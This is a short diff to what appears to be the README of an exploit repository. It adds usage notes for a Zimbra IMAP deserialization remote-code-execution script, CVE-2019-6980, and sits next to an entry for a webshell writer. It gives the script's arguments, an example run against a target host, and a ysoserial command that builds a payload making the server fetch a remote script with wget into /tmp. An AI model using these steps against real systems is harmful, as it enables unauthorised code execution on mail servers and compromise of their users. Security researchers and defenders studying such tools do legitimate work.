@@ -437,3 +437,27 @@ webshellWrite.aspx:
 ```
 
 ---
+
+### Zimbra_deserialization_RCE(CVE-2019-6980).py
+
+Insecure object deserialization - IMAP
+
+Usage:
+
+```
+<url> <user> <password> <payload path>
+```
+
+Eg.
+
+```
+https://192.168.1.1 user1@test.com password1 payload.obj
+```
+
+Note:
+
+You can generate payload.obj like this:
+
+`java -jar ysoserial.jar MozillaRhino2 "/usr/bin/wget https://192.168.1.1/test.sh --no-check-certificate -O /tmp/test.sh" > payload.obj`
+
+----
